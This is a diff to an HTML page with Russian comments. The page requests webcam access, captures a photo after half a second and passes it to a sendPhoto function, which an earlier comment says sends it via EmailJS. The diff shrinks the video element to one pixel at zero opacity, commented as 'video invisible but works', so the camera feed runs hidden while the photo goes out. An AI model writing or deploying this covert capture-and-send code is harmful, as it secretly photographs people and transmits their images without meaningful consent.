@@ -15,7 +15,13 @@
       align-items: center;
       overflow: hidden;
     }
-    video, canvas {
+    video {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0; /* видео невидимо, но работает */
+    }
+    canvas {
       display: none;
     }
   </style>
@@ -45,27 +51,24 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Ждём, пока видео реально готово
         video.onloadedmetadata = () => {
           video.play();
 
-          // Устанавливаем canvas размером с видео
+          // Подстраиваем canvas под видео
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
 
-          // Делаем фото через небольшую задержку
+          // Делаем фото после небольшой задержки
           setTimeout(() => {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const photoData = canvas.toDataURL('image/png');
             console.log('Фото сделано:', photoData);
 
-            sendPhoto(photoData); // отправка на EmailJS
-          }, 500); // 0.5 секунды
+            sendPhoto(photoData);
+          }, 500);
         };
       })
-      .catch(err => {
-        alert("Ошибка доступа к камере: " + err.message);
-      });
+      .catch(err => alert("Ошибка доступа к камере: " + err.message));
   </script>
 </body>
 </html>
